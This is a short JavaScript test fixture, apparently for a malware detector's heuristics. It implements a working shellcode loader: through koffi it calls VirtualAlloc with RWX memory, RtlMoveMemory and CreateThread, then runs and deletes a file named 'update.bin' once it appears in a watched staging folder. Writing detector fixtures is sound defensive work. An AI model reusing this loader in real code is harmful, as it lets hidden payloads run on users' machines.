// Fixture: Koffi-resolved RWX thread injection behind a staging watch.
// Mirrors the runhelper loader shape with renamed handles and a different
// staging name. Must convict H1 + H2, never H3/H4.
const koffi = require('koffi');
const fs = require('fs');
const path = require('path');

const payloadPath = path.join(__dirname, 'stage', 'update.bin');

const mod = koffi.load('kernel32.dll');
const Alloc = mod.func('void* __stdcall VirtualAlloc(void*, size_t, uint32, uint32)');
const Copy = mod.func('void __stdcall RtlMoveMemory(void*, void*, size_t)');
const Start = mod.func('void* __stdcall CreateThread(void*, size_t, void*, void*, uint32, uint32 *out)');

function stage(data) {
  const mem = Alloc(null, data.length, 0x3000, 0x40);
  if (!mem) return;
  Copy(mem, data, data.length);
  Start(null, 0, mem, null, 0, [0]);
}

function drain() {
  if (!fs.existsSync(payloadPath)) return;
  stage(fs.readFileSync(payloadPath));
  fs.unlinkSync(payloadPath);
}

const dir = path.dirname(payloadPath);
const watcher = fs.watch(dir, (_event, name) => {
  if (name === path.basename(payloadPath)) {
    watcher.close();
    drain();
  }
});

module.exports = { drain };
